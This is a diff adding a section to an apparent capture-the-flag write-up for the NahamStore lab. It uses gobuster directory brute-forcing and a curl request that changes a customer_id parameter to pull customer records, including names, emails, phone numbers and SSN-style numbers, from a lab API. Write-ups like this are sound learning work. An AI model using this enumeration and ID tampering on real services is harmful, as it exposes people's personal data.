@@ -888,6 +888,42 @@ Table: sqli_two
 ```
 {% endcode %}
 
+## Task 3
+
+After completing the RCE section and reading the host file we can go forward.
+
+{% code overflow="wrap" %}
+```bash
+gobuster dir -u http://nahamstore-2020-dev.nahamstore.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -b 404,403 --no-error -t 200
+
+/api
+/customers
+```
+{% endcode %}
+
+When we hit [http://nahamstore-2020-dev.nahamstore.thm/api/customers/](http://nahamstore-2020-dev.nahamstore.thm/api/customers/), there is an error message: `"customer_id is required"` so we know the parameter to provide.
+
+```bash
+dking@dking ~/Downloads$ curl "http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=2" -s | jq
+{
+  "id": 1,
+  "name": "Rita Miles",
+  "email": "rita.miles969@gmail.com",
+  "tel": "816-719-7115",
+  "ssn": "366-24-2649"
+}
+{
+  "id": 2,
+  "name": "Jimmy Jones",
+  "email": "jd.jones1997@yahoo.com",
+  "tel": "501-392-5473",
+  "ssn": "521-61-6392"
+}
+
+```
+
+And we get answer for Task 3.
+
 Done!
 
 Learned a lot from this room 🤗
